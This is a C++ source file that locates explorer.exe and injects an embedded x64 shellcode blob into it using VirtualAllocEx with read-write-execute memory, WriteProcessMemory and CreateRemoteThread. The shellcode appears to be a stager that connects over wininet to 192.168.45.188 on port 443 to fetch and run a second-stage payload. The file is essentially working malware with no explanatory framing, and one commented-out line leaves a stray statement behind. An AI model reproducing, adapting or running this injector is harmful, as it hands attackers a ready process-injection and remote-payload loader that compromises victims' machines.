#include "pch.h"
#include "Windows.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetExplorerPID() {
	DWORD explorerPID = 0;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		//std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		//std::cerr << "Process32First failed: " << GetLastError() << std::endl;
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return 0;
	}

	// Now walk the snapshot of processes
	do {
		if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
			explorerPID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return explorerPID;
}

using namespace System;

int main(array<System::String ^> ^args)
{
   
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51"
		"\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
		"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
		"\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
		"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
		"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
		"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
		"\x00\x00\xff\xd5\xe8\x0f\x00\x00\x00\x31\x39\x32\x2e\x31"
		"\x36\x38\x2e\x34\x35\x2e\x31\x38\x38\x00\x5a\x48\x89\xc1"
		"\x49\xc7\xc0\xbb\x01\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03"
		"\x53\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8"
		"\xd9\x00\x00\x00\x2f\x70\x37\x6a\x63\x66\x5a\x52\x46\x33"
		"\x4f\x49\x6c\x31\x79\x54\x56\x51\x30\x38\x31\x5a\x51\x77"
		"\x6f\x47\x54\x33\x69\x39\x67\x79\x32\x77\x6e\x59\x4e\x63"
		"\x34\x36\x73\x5f\x57\x61\x38\x5a\x75\x6a\x64\x54\x42\x77"
		"\x50\x4e\x69\x41\x31\x31\x39\x58\x70\x77\x63\x73\x71\x35"
		"\x4e\x7a\x59\x4c\x6a\x2d\x36\x32\x51\x30\x79\x43\x51\x4b"
		"\x69\x7a\x62\x70\x4a\x31\x56\x48\x31\x73\x6a\x6a\x70\x56"
		"\x42\x30\x42\x33\x55\x69\x38\x44\x44\x6e\x64\x41\x64\x6e"
		"\x33\x41\x76\x70\x50\x65\x64\x4b\x50\x66\x78\x45\x79\x43"
		"\x4f\x45\x41\x61\x36\x73\x35\x45\x62\x42\x68\x4f\x50\x78"
		"\x59\x37\x30\x48\x4e\x68\x65\x45\x34\x74\x4e\x44\x66\x30"
		"\x33\x71\x4c\x4c\x44\x63\x64\x5a\x6b\x34\x42\x62\x54\x38"
		"\x49\x4b\x74\x5a\x46\x73\x68\x64\x4c\x63\x68\x4a\x77\x77"
		"\x68\x51\x66\x70\x65\x4a\x34\x56\x47\x5f\x67\x69\x44\x31"
		"\x49\x63\x4e\x41\x65\x61\x44\x48\x61\x4a\x69\x4b\x78\x5f"
		"\x48\x79\x5f\x4e\x65\x2d\x33\x50\x56\x74\x00\x48\x89\xc1"
		"\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84"
		"\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b"
		"\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a"
		"\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59\x49"
		"\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0"
		"\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53\x49"
		"\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7"
		"\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00"
		"\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00"
		"\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7"
		"\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00"
		"\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48"
		"\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba"
		"\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20"
		"\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2"
		"\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda"
		"\xff\xd5";



	const char* k = "[+]";
	const char* i = "[*]";
	const char* e = "[-]";
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	DWORD explorerPID = GetExplorerPID();
	//if (explorerPID != 0) {
	//	std::cout << "The PID of explorer.exe is: " << explorerPID << std::endl;
	//}
	//else {
	//	std::cout << "Failed to find the PID of explorer.exe" << std::endl;
	//}
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
	//printf("%s Got a handle to the process!\n\\---0x%p\n", k, processHandle);

	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	if (remoteBuffer != 0) {
		WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);


		remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
		if (remoteThread == NULL) {
			//printf("%s Could'nt get a handle to the thread, error: %ld\n", e,
				GetLastError());
			CloseHandle(processHandle);
			return EXIT_FAILURE;
		}
		//CloseHandle(processHandle);
	}
	else {
		std::cout << "Remote Buffer = 0" << std::endl;
	}

	return 0;

}
